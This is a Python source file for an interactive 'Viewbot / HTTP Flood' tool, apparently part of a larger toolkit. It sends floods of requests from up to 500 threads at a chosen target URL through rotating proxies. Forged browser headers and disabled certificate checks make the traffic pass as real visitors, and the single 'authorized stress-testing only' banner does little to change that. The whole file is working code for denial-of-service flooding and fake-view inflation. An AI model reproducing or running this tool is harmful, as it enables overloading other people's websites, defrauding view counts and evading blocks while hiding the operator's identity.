"""Viewbot / HTTP Flood — Multi-target HTTP request tool with rotating proxies."""

import os
import sys
import time
import random
import threading
import urllib.request
import urllib.error
import ssl
import json

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

PROXY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'valid_proxies.txt')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]

REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://twitter.com/", "https://www.reddit.com/", "https://www.facebook.com/",
    "https://www.instagram.com/", "https://t.me/", "https://discord.com/",
    "https://www.youtube.com/", "https://www.tiktok.com/", "https://www.twitch.tv/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9",
    "es-ES,es;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9",
    "zh-CN,zh;q=0.9", "ru-RU,ru;q=0.9", "it-IT,it;q=0.9", "ar-SA,ar;q=0.9",
]

stop_flag = False
stats = {"success": 0, "fail": 0, "proxy_fail": 0, "403": 0, "timeout": 0, "other": 0}
lock = threading.Lock()
debug_log = []
debug_lock = threading.Lock()

def _dbg(msg):
    ts = time.strftime('%H:%M:%S')
    with debug_lock:
        debug_log.append(f"[{ts}] {msg}")

def _load_proxies():
    proxies = []
    for path in [PROXY_FILE, os.path.join(os.getcwd(), 'valid_proxies.txt')]:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if not line.startswith(('http://', 'https://', 'socks')):
                            line = 'http://' + line
                        proxies.append(line)
    return list(set(proxies))

def _send_view(url, proxy=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGS),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Referer': random.choice(REFERRERS),
        'DNT': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }
    if random.random() < 0.3:
        headers['Sec-Ch-Ua'] = '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"'
        headers['Sec-Ch-Ua-Mobile'] = '?0'
        headers['Sec-Ch-Ua-Platform'] = '"Windows"'
    proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy}) if proxy else urllib.request.ProxyHandler({})
    opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = opener.open(req, timeout=8)
        body = resp.read(2048)
        status = resp.status
        _dbg(f"OK {status} via {proxy or 'direct'}")
        return status
    except urllib.error.HTTPError as e:
        _dbg(f"HTTP {e.code} via {proxy or 'direct'}")
        return e.code
    except urllib.error.URLError:
        _dbg(f"TIMEOUT via {proxy or 'direct'}")
        return 0
    except Exception as e:
        _dbg(f"ERR {str(e)[:30]} via {proxy or 'direct'}")
        return 0

def _worker(url, proxies, delay, debug):
    global stop_flag
    while not stop_flag:
        proxy = random.choice(proxies) if proxies else None
        try:
            status = _send_view(url, proxy)
            with lock:
                if status in (200, 301, 302, 304):
                    stats["success"] += 1
                elif status == 403:
                    stats["403"] += 1
                elif status == 0:
                    stats["timeout"] += 1
                else:
                    stats["other"] += 1
        except Exception:
            with lock:
                stats["proxy_fail"] += 1
        time.sleep(delay + random.uniform(-0.3, 0.5))


def run(kevbin=None):
    global stop_flag, stats, debug_log
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        proxies = _load_proxies()
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       VIEWBOT / HTTP FLOOD{dbg}" + " "*(28-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] For authorized stress-testing only\033[0m")
        print()
        cprint("  \033[97m[1]  Start HTTP Flood\033[0m")
        cprint("  \033[97m[2]  Test Single Request\033[0m")
        cprint("  \033[97m[3]  Check Proxies\033[0m")
        cprint("  \033[97m[4]  View Debug Log\033[0m")
        cprint("  \033[97m[5]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        cprint(f"  \033[90m  Proxies loaded: {len(proxies)}\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '5':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug: {state}")
            time.sleep(0.5)
            continue
        elif choice == '1':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  HTTP FLOOD CONFIG\033[0m")
            cprint("  \033[93m\u2550"*54)
            url = prompt("  \033[96mTarget URL: \033[0m").strip()
            if not url: continue
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            try:
                threads = int(prompt("  \033[96mThreads (1-500, default 50): \033[0m").strip() or '50')
            except: threads = 50
            threads = max(1, min(500, threads))
            try:
                duration = int(prompt("  \033[96mDuration seconds (5-3600, default 60): \033[0m").strip() or '60')
            except: duration = 60
            duration = max(5, min(3600, duration))
            try:
                delay = float(prompt("  \033[96mDelay sec (0-10, default 0): \033[0m").strip() or '0')
            except: delay = 0
            delay = max(0, min(10, delay))
            use_proxy = True
            if not proxies:
                cprint("  \033[93m[!] No proxies — running direct (your IP)\033[0m")
                use_proxy = False
            print()
            if debug_mode:
                cprint(f"  \033[90m[DBG] URL: {url}\033[0m")
                cprint(f"  \033[90m[DBG] Threads: {threads} Duration: {duration}s Delay: {delay}s\033[0m")
                cprint(f"  \033[90m[DBG] Proxies: {len(proxies)}\033[0m")
            stop_flag = False
            stats = {"success": 0, "fail": 0, "proxy_fail": 0, "403": 0, "timeout": 0, "other": 0}
            debug_log.clear()
            _dbg(f"Starting flood: {url} | {threads}t | {duration}s | proxy={use_proxy}")
            cprint(f"  \033[36m[*] Starting: {url}")
            cprint(f"    Threads: {threads} | Duration: {duration}s | Proxy: {use_proxy}\033[0m\n")
            t_list = []
            for _ in range(threads):
                t = threading.Thread(target=_worker, args=(url, proxies if use_proxy else [], delay, debug_mode), daemon=True)
                t.start()
                t_list.append(t)
            start = time.time()
            try:
                while time.time() - start < duration:
                    elapsed = time.time() - start
                    pct = elapsed / duration
                    bar_w = 40
                    filled = int(bar_w * pct)
                    bar = "\033[92m" + "\u2588" * filled + "\033[90m" + "\u2591" * (bar_w - filled) + "\033[0m"
                    with lock:
                        ok = stats["success"]
                        f403 = stats["403"]
                        tout = stats["timeout"]
                        other = stats["other"]
                    total_req = ok + f403 + tout + other
                    rps = total_req / max(elapsed, 0.001)
                    sys.stdout.write(
                        f"\r  [{bar}] \033[97m{pct*100:5.1f}%\033[0m "
                        f"\033[92m{ok}\033[0m ok "
                        f"\033[93m{f403}\033[0m 403 "
                        f"\033[91m{tout}\033[0m timeout "
                        f"\033[90m{other}\033[0m other "
                        f"\033[96m{rps:.1f}/s\033[0m  "
                    )
                    sys.stdout.flush()
                    time.sleep(0.3)
            except KeyboardInterrupt:
                pass
            stop_flag = True
            time.sleep(1)
            sys.stdout.write("\r" + " " * 120 + "\r")
            sys.stdout.flush()
            elapsed = time.time() - start
            with lock:
                final = dict(stats)
            total = final["success"] + final["403"] + final["timeout"] + final["other"]
            cprint(f"\n  \033[92m[X] FLOOD COMPLETE\033[0m")
            cprint(f"  \033[97m  Duration: {elapsed:.1f}s\033[0m")
            cprint(f"  \033[92m  Success (2xx/3xx): {final['success']}\033[0m")
            cprint(f"  \033[93m  Blocked (403):     {final['403']}\033[0m")
            cprint(f"  \033[91m  Timeout/ConnFail:  {final['timeout']}\033[0m")
            cprint(f"  \033[90m  Other errors:      {final['other']}\033[0m")
            cprint(f"  \033[96m  Total requests:    {total} ({total/max(elapsed,0.001):.1f}/s)\033[0m")
        elif choice == '2':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  SINGLE REQUEST TEST\033[0m")
            cprint("  \033[93m\u2550"*54)
            url = prompt("  \033[96mURL: \033[0m").strip()
            if not url: continue
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            cprint("  \033[36m[*] Sending request...\033[0m")
            status = _send_view(url)
            if status in (200, 301, 302):
                cprint(f"  \033[92m  Status: {status} (OK)\033[0m")
            elif status == 403:
                cprint(f"  \033[93m  Status: {status} (BLOCKED)\033[0m")
            elif status == 0:
                cprint(f"  \033[91m  Status: TIMEOUT / CONNECTION REFUSED\033[0m")
            else:
                cprint(f"  \033[90m  Status: {status}\033[0m")
            if debug_mode:
                with debug_lock:
                    for line in debug_log[-5:]:
                        cprint(f"  \033[90m[DBG] {line}\033[0m")
        elif choice == '3':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  PROXY CHECK\033[0m")
            cprint("  \033[93m\u2550"*54)
            if not proxies:
                cprint("  \033[91m[X] No proxies found\033[0m")
            else:
                cprint(f"  \033[36m[*] Testing {len(proxies)} proxies...\033[0m\n")
                good = 0; bad = 0
                for i, proxy in enumerate(proxies, 1):
                    status = _send_view("https://httpbin.org/ip", proxy)
                    if status == 200:
                        good += 1
                        sys.stdout.write(f"\r  \033[92m[{i}/{len(proxies)}]\033[0m {proxy[:45]} OK  ")
                    else:
                        bad += 1
                    sys.stdout.flush()
                cprint(f"\n\n  \033[92m  Working: {good}\033[0m | \033[91m  Dead: {bad}\033[0m")
        elif choice == '4':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  DEBUG LOG\033[0m")
            cprint("  \033[93m\u2550"*54)
            with debug_lock:
                if not debug_log:
                    cprint("  \033[90mNo debug entries yet\033[0m")
                else:
                    for line in debug_log[-50:]:
                        cprint(f"  \033[90m{line}\033[0m")
                    cprint(f"\n  \033[90m  Total: {len(debug_log)} entries\033[0m")
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
